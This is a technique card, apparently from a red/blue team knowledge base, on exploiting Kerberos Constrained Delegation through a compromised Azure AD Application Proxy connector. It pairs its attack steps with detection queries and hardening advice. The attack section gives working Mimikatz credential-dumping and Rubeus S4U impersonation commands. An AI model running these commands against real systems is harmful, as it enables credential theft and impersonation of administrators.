# [IA-EXPLOIT-001]: Azure Application Proxy Exploitation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IA-EXPLOIT-001 |
| **MITRE ATT&CK v18.1** | [Exploit Public-Facing Application (T1190)](https://attack.mitre.org/techniques/T1190/) |
| **Tactic** | Initial Access |
| **Platforms** | Entra ID / Hybrid |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Exploiting misconfigured Azure AD Application Proxy connectors, specifically those using **Kerberos Constrained Delegation (KCD)**. If an attacker compromises the server running the App Proxy Connector, they can extract the connector's identity or abuse KCD to impersonate *any* user to the backend application it protects.
- **Attack Surface:** The App Proxy Connector agent and its KCD configuration (S4U2Proxy).
- **Business Impact:** **Unauthenticated Access to Internal Apps**. Bypasses pre-authentication enforced by Entra ID if the connector itself is compromised.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Compromised Connector Server (Local Admin).
- **Vulnerable Config:** Connector configured with KCD to backend apps, allowing `S4U2Proxy` (Constrained Delegation) without resource-based restrictions.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Rubeus](https://github.com/GhostPack/Rubeus)
    - [Kekeo](https://github.com/gentilkiwi/kekeo)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Dump Keytab/Hash**
On the compromised Connector server, dump the machine account hash or tickets. The connector service runs as a machine account or a gMSA.

```powershell
# Using Mimikatz to dump logon passwords/hashes
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Step 2: Forge Ticket (Silver Ticket / S4U)**
Use `Rubeus` to request a service ticket for the backend service (e.g., HTTP/internal-app.corp.local) as a high-privilege user (e.g., Domain Admin). This abuses the KCD trust.

```powershell
# S4U2Self + S4U2Proxy
# /user: The machine account of the Connector Server
# /rc4: The hash of the machine account
# /impersonateuser: The user we want to be (Administrator)
# /msdsspn: The SPN of the backend app we want to access

.\Rubeus.exe s4u /user:ConnectorMachine$ /rc4:[HASH] /impersonateuser:Administrator /msdsspn:HTTP/internal-app.corp.local /ptt
```

**Step 3: Access Backend**
With the ticket injected (`/ptt`), access the internal application directly, bypassing Azure AD Auth.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Windows Event Logs (DC)
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4769 | Service Name = Backend SPN, Source IP = Connector Server, Ticket Options includes Constrained Delegation (0x20000) |
| **Security** | 4768 | TGT Request for the Connector Machine Account (normal, but look for spikes) |

#### 5.2 Sentinel (KQL)
Detect anomalous Kerberos service ticket requests involving delegation from App Proxy servers.

```kusto
SecurityEvent
| where EventID == 4769
| where ServiceName has "HTTP/" // Backend app SPN
| where IpAddress == "[Connector_Server_IP]"
| where Status == "0x0"
| project TimeGenerated, TargetUserName, ServiceName, IpAddress
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Identity:** Use **Resource Based Constrained Delegation (RBCD)** instead of standard KCD where possible. RBCD puts the control on the *backend resource* rather than the connector.
*   **Hardening:** Treat Connector servers as **Tier 0** assets (same security level as Domain Controllers) because compromising them allows impersonation.
*   **Network:** Isolate Connector servers in a dedicated DMZ/VLAN with strict egress rules.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001] (Compromise of the Connector Server)
> **Next Logical Step:** [LAT-AD-001] (Lateral Movement to Backend App)
